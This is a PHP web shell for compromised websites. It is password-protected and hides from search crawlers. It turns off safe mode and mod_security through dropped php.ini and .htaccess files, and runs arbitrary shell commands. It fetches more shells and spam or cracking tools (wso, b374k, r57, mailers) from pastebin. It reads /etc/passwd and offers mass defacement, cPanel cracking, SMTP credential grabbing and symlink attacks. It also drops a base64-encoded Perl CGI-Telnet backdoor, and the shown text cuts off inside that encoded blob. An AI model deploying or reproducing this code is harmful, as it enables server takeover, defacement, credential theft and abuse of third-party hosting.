<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
 
$auth_pass = "39a54ee9b50e3484df126d83277593dc"; // default: achan
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<html>
<head>
<title>root@tuan2fay:~$ sudo su</title>
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
    color: green;
    text-align: center;
}
header {
    color: green;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: #000000;
    border: 1px dotted green;
    padding: 5px;
    margin-left: 20px;
    text-align: center;
}
</style>
</head>
<center>
<header><br><br>
<img src="https://2.bp.blogspot.com/-mzd801X0yRA/WJuipsslXRI/AAAAAAAAAok/MvceDJDLdeg0yu4PbA6vq31Mn2KfdFFNgCLcB/s1600/gsh.png" width="500px" height="350px"/>
<br>
 <br>
 <font face="System" color="green">root@tuan2fay:~$ sudo su </font><br><br>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'k3wnload')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<center>
<title>_Tuan2Fay_ 48</title>
<meta name='author' content='Mr Seccretz!'>
<meta charset="UTF-8">
<center><style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background:black;
    color: #ffffff;
    font-family: 'abel';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'abel';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'abel';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'abel';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: cyan; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'abel';
	font-size: 13px;
}
option:hover {
	background: cyan;
	color: #000000;
}
</style>
</head>
<center>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}
if (file_exists(".htaccess")){
}else{
$img2 = fopen('.htaccess', 'w');
$sec2 = "<IfModule mod_security.c>
		SecFilterEngine Off
		SecFilterScanPOST Off
		</IfModule>";
fwrite($img2 ,$sec2);
fclose($img2);}			
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/kthree_tools/".$names.".php";
if (file_exists('kthree_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "kthree_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("kthree_tools", 0777);
file_put_contents('kthree_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "kthree_tools/'.$names.'.php";</script> ';}}}

CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("adminer"."https://www.adminer.org/static/download/4.2.5/adminer-4.2.5.php");
CreateTools("b374k","http://pastebin.com/raw/rZiyaRGV");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("gamestopceker","http://pastebin.com/raw/QSnw1JXV");
CreateTools("bukapalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokopedia","http://pastebin.com/dvhzWgby");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
CreateTools("bh","http://pastebin.com/raw/3L2ESWeu");
CreateTools("dhanus","http://pastebin.com/raw/v4xGus6X");
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		}

$sport=$_SERVER['SERVER_PORT'];
echo "<table style='width:100%'>";
echo "<tr><td>System: <font color=lime>".php_uname()."</font></td></tr>";
echo "<tr><td>User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")</td></tr>";
echo "<tr><td>Server IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font></td></tr>";
echo "<tr><td>HDD: <font color=lime>".hdd(disk_free_space("/"))."</font> / <font color=lime>".hdd(disk_total_space("/"))."</font></td></tr>";
echo "<tr><td>Websites :<font color=lime> $count </font> Domains</td></tr>";
echo "<tr><td>Port :<font color=lime>  $sport</font> </td></tr>";
echo "<tr><td>Safe Mode: $sm</td></tr>";
echo "<tr><td>Disable Functions: $show_ds</td></tr>";
echo "<tr><td>MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </td></tr>";
echo "<tr><td>Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "</td></tr></table><hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=upload'>Upload</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=cmd'>Command</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=config'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=lcf'>LiteSpeed Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=jumping'>Jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=symlink'>Symlink</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&k3=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=defacerid'>Defacer.ID</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=cgi'>CGI Telnet</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&k3=adminer'>Adminer</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=auto_dwp'>WordPress Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=auto_dwp2'>WordPress Auto Deface V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=passwbypass'>Bypass etc/passw</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&k3=loghunter'>Log Hunter</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=shellchk'>Shell Checker</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=shelscan'>Shell Finder</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=cgi'>CGI Shell</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=cgi2'>CGI Shell 2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=zip'>Zip Menu</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=about'>About</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&k3=metu'>LogOut</a> ]<br></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['k3'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
		} else {
			$act = "<font color=red>failed to upload file</font>";
		}
	}
	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
}
elseif($_GET['k3'] == 'cgi2') {
	$cgi_dir = mkdir('kthree_cgi', 0755);
        chdir('kthree_cgi');
	$file_cgi = "cgi2.kthree";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .kthree \n AddHandler cgi-script .kthree \n AddHandler cgi-script .kthree";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgQ29uN2V4dA0KIyBUaGFua3MgVG8gOiAweDE5OTkgLSBYYWkgU3luZGljYXRlIFRlYW0gLSBBbmQgWW91DQogDQokV2luTlQgPSAwOw0KJE5UQ21kU2VwID0gIiYiOw0KJFVuaXhDbWRTZXAgPSAiOyI7DQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0Kc3ViIFJlYWRQYXJzZQ0Kew0KICAgIGxvY2FsICgqaW4pID0gQF8gaWYgQF87DQogICAgbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCiAgIA0KICAgICRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KIA0KICAgIGlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQogICAgew0KICAgICAgICAkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCiAgICB9DQogICAgZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQogICAgew0KICAgICAgICBiaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQogICAgICAgIHJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQogICAgfQ0KIA0KICAgICMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCiAgICBpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCiAgICB7DQogICAgICAgICRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCiAgICAgICAgQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCiAgICAgICAgJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiAgICAgICAgJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KICAgICAgICAkSGVhZGVyID0gJGA7DQogICAgICAgICRCb2R5ID0gJCc7DQogICAgICAgICRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCiAgICAgICAgJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQogICAgICAgICRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsNCiAgICAgICAgJGlueydmJ30gPSAkMTsNCiAgICAgICAgJGlueydmJ30gPX4gcy9cIi8vZzsNCiAgICAgICAgJGlueydmJ30gPX4gcy9ccy8vZzsNCiANCiAgICAgICAgIyBwYXJzZSB0cmFpbGVyDQogICAgICAgIGZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgICRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KICAgICAgICAgICAgJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KICAgICAgICAgICAgJGtleSA9ICQxOw0KICAgICAgICAgICAgJHZhbCA9ICQnOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KICAgIHsNCiAgICAgICAgQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KICAgICAgICBmb3JlYWNoICRpICgwIC4uICQjaW4pDQogICAgICAgIHsNCiAgICAgICAgICAgICRpblskaV0gPX4gcy9cKy8gL2c7DQogICAgICAgICAgICAoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KICAgICAgICAgICAgJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+Q29uN2V4dCBDR0ktVGVsbmV0PC90aXRsZT4NCiRIdG1sTWV0YUhlYWRlcg0KPHN0eWxlPg0KQGZvbnQtZmFjZSB7DQogICAgZm9udC1mYW1pbHk6ICd1YnVudHVfbW9ub3JlZ3VsYXInOw0Kc3JjOiB1cmwoZGF0YTphcHBsaWNhdGlvbi94LWZvbnQtd29mZjtjaGFyc2V0PXV0Zi04O2Jhc2U2NCxkMDlHUmdBQkFBQUFBR1dJQUJNQUFBQUF2REFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkdSbFJOQUFBQnFBQUFBQndBQUFBY1pPK0hkRWRFUlVZQUFBSEVBQUFBS1FBQUFDd0NJd0VKUjFCUFV3QUFBZkFBQUFBeUFBQUFRRFhPVHJCSFUxVkNBQUFDSkFBQUFWa0FBQUlHbE52SnFFOVRMeklBQUFPQUFBQUFYUUFBQUdDWlZRVFpZMjFoY0FBQUErQUFBQUdPQUFBQjZnQ0xqQlpqZG5RZ0FBQUZjQUFBQUVvQUFBQktFMGtPYzJad1oyMEFBQVc4QUFBQnNRQUFBbVZUdEMrbloyRnpjQUFBQjNBQUFBQUlBQUFBQ0FBQUFCQm5iSGxtQUFBSGVBQUFWbUVBQUtXMElydDJQR2hsWVdRQUFGM2NBQUFBTUFBQUFEWUF5MkxEYUdobFlRQUFYZ3dBQUFBY0FBQUFKQXFtQlA5b2JYUjRBQUJlS0FBQUFXZ0FBQU9paG1GeENHeHZZMkVBQUYrUUFBQUJ5QUFBQWRRT1VUYVFiV0Y0Y0FBQVlWZ0FBQUFnQUFBQUlBSUdBaFZ1WVcxbEFBQmhlQUFBQVhzQUFBUE9ZbGVLclhCdmMzUUFBR0wwQUFBQjRnQUFBdFFzQnFVTWNISmxjQUFBWk5nQUFBQ25BQUFCQnFRVHZHNTNaV0ptQUFCbGdBQUFBQVlBQUFBR2RWdFNwZ0FBQUFFQUFBQUF6RDJpendBQUFBREo1YjdMQUFBQUFNN01KZGw0Mm1OZ1pHQmc0QU5pRlFZUVlHSmdCdUk2QmthR2VvWkdJS3VKNFFXUXpRS1dZUUFBTm1JRExRQUFBSGphWTJCa1lHRGdZckJoc0dOZ1RxNHN5bUVRU1M5S3pXYVF5MGtzeVdQUVlHQUJ5akw4L3c4a3NMR0FBQUIza3d2N0FBQjQybldSeDBwRFFSaUZ2K3MxTGtKd0ZRdmlJb2dsOWhoakw4UVNCR01NWEYyNUVHS01Ma3dpM0JoQmlTdDc3dzA3UG9XNHM3eUlMNkovaG92Z1FvWTVmNWx6WnM3TW9BRjJIdmxDank2WmNaeXpabXlPOW5oa0lja3doZWo5UTRhTHdsQndVSERNNkJlRTcyOXlSYWVSSXpHYi9lMlVZZXViQ0xqd0RoampncUh3aUF1L0VRNEpqaHRCNlNpK3plTHJXZVVmZmJiU3Bjcm10c2lNR2NVVmphUml1SlBwaEVuRHZEbWR4SmRLZWJ4MEtsYU9ZbXZXRGlqVWZsZHNPSEJTU2psMXFxdmh0bUtyRmYza3FUaHExVk9pYzRneVE1cEZxWFVLNU5aRjByWExUTENpZkFZWSs0ZW5TMTRzTTkveW9xdjFqT1ZwV1Z4WFVFbVYrS2ltaGxyeFZVOERqWGhva3JkcHhrZUxlR3VqblE3aGR0Rk5ENzJzc3NZNkcyeXl4VFk3N0xMSFBnY2Njc1F4SjV4eXhqa1hYSExGTlRmY2NzYzlEL0szVDN6eXJsNHp3S1I0ZU9hRkVsNTVrL00rWkhUOEFHblZTcUVBQUFCNDJtTmdabjdCT0lHQmxZR0ZkUmFyTVFNRG96eUVacjdJa01iRXdNREF4TTNLeWN6R3hNekU4b0NCNlg4QWcwSTBBeFM0T1BvNk1qZ3c4UDVtWWt2N2w4YkF3TGFFcVUrQmdXRitHQ05ROXphV0wwQWxDZ3hNQUwzNkQ3NEFBQUI0Mm1OZ1lHQm1nR0FaQmtZR0VIZ0M1REdDK1N3TUo0QzBIb01Da01VSFpQRXl5RExVTWZ4bkRHYXNZRHJHZEVlQlMwRkVRVXBCVGtGSlFVMUJYOEZLSVY1aGphS1M2cC9mVFAvL2cwMENxVmRnV01BWUJGWFBvQ0NnSUtFZ0ExVnZDVmZQQ0ZUUC9QL3IvMmYvbi93Ly9ML3d2KzgvaHIrdkg1eDRjUGpCZ1FmN0greDVzUFBCeGdjckhyUThzTGgvK05ZcjFtZFFkNUlBR05rZ1hnU3ptWUFFRTVvQ29DUUxLeHM3QnljWE53OHZINytBb0pDd2lLaVl1SVNrbExTTXJKeThncUtTc29xcW1ycUdwcGEyanE2ZXZvR2hrYkdKcVptNWhhV1Z0WTJ0bmIyRG81T3ppNnVidTRlbmw3ZVByNTkvUUdCUWNFaG9XSGhFWkZSMFRHeGNmRUppRWtON1IxZlBsSm56bHl4ZXVuelppbFZyVnE5ZHQySDl4azFidG0zZHZuUEgzajM3OWpNVXA2WmwzYXRjVkpqenREeWJvWE0yUXdrRFEwWUYySFc1dFF3cmR6ZWw1SVBZZVhYM2s1dmJaaHcrY3UzNjdUczNidTVpT0hTVTRjbkRSODlmTUZUZHVzdlEydHZTMXoxaDRxVCthZE1acHM2ZE40ZmgyUEVpb0tacUlBWUFKb2FNeEFBQUFBQUR0Z1QwQUpBQWh3Q0pBSXNBbGdESUFSSUFxQUVHQUprQW93Q29BS3dBc0FDMkFKVUFvUUNjQUs0QWRRQ3lBSGtBZkFDVEFLb0FqUUNmQUtZQWR3QnRBSEFBZndCRUJSRUFBSGphWFZHN1RsdEJFTjBORHdPQnhOZ2dPZG9VczVtUXhudWhCUW5FMVkxaVpEdUY1UWhwTjNLUmkzRUJIMENCUkEzYXJ4bWdvYVJJbXdZaEYwaDhRajRoRWpOcmlLSTBPenV6Yzg2Wk0wdktrYXAzNld2UFUrY2trTUxkQnMwMi9VNUl0Yk1BOTZUcjY0Mk10SU1IV214bTlNcDErLzRMQnB2UmxEdHFBT1U5YnlrUEdVMDdnVnEwcC83Ui9BcUcrL3dmOHpzWXREVFQ5TlE2Q2VraEJPYWJjVXVEN3huTnVzc1Arb0xWNFdJd01LU1lwdUl1UDZaUy9yYzA1MnJMc0xXUjBieURNeEg1eVRSQVUydHRCSnIrMUNIVjgzRVVTNURMcHJFMm1KaXkvaVFUd1lYSmRGVlR0Y3o0MnNGZHNyUG9ZSU1xellFSDJNTldlUXdlRGc4bUZOSzNKTW9zRFJIMllxdkVDQkdUSEFvNTVkekovcVJBK1VnU3hyeEpTanZqaHJVR3hwSFh3S0EyVDdQL1BKdE5iVzhkd3ZoWkhNRjN2eGxMT3ZqSWh0b1lFV0k3WWltQUNVUkNSbFg1aGhyUHZTd0c1Rkw3ejBDVWdPWHhqMytkQ0xUdTJFUThsN1YxRGpGV0NIcCsyOXp5eTRxN1Zybk9pMEozYjZwcXFOSXB6ZnRlenI3SEE1NGVDOE5CWThHYnovditTb0g2UEN5dU5HZ09CRU42TjNyL29yWHFpS3U4Rno2eUo5Ty9zVm9BQUFBQUFRQUIvLzhBRDNqYTdMME5mQnZsbFRjNno0eStMT3RqUnArV1pGbVdGVmxSRkhraUtZcWlPSTRkeHhqSEdOZDFYYTlyakFraDVBdlNZSXhKZzV2MTlXYlROQTNCQ1FHYXBpbE5hWmJONXViTnpzZ2lVSmZTVUxhWHNpekw5bkliZmx6ZWJyZmJiVmwzYVpkU3l2S1JpUGVjWjBiK2lPMlE3YmJ2ZSsvdjk1WmFIelBLekhuT2M1NXovdWZqT2NPd1RCUERzSnUwbjJZNFJzL1V5SVFSVitmMG10Q3ZrckpPKzk5WDV6Z1dQakl5aDRlMWVEaW4xeTI2dERwSDhIaEtDQXJob0JCc1lpc0xpOGl4d2xidHB6LzRQNXMwTHpGd1NUTDQwUnZzUHMwN1RDbmpZVnFZWEFuRHhHU3VaREpuWnBrWWtieWl4RnlVZGFXVCtEZHUxVEdHbUd3U0ppV1RLRnVGU2RsSFlyTFZKTmprRWk2YlpXUXpKOWdrUjNaWklyeDhSU3JwY2pwMG9hcHF1NUFTSEJaV0g2cmh5R0JuSnR2UmtjMTBpdWMxUnJQdUhwM1pxQm1zYjJ1cnI3K3hqZHRHZWdxbjIwWUc3MXBUTnpBNGdyUVp1QUgyUGUxT3BvU3hNeldNcEJjbFBwVW5KWXhCRTVOS2swUnlVT280MDZURThiSVJhREdiSm1VbmlUSExFaVNkZ3R2RFRVbDQ2aE14UE9ya3V5MU8wdm1vMDlMTk83V09tMjd1ZldQRGhqZjYxSGU0SjVOaEdPNEY0SWVQQ1pDYm1ad1grSkZ6dWp5cFZDcW5CNWJrREtVbStKeG5pRmR2am8yelFybC9rVHNsTTlySmNZZTd6TGZJbmN4ck5mUVV4MWNFOEpSV016bXVLekdhNFJTUktrWEplMUgyQU1VZVhuWUJ4VTdUSkZ6ZUdCdHZjTnBMWXBJbE9XNXd1b0RKZXZpSlhwUU5jRnB2d05ONkJrNXJrcEtUbDB2aDM1bGdwRUVTazFaNEo5Yjg2enUxakRObW5G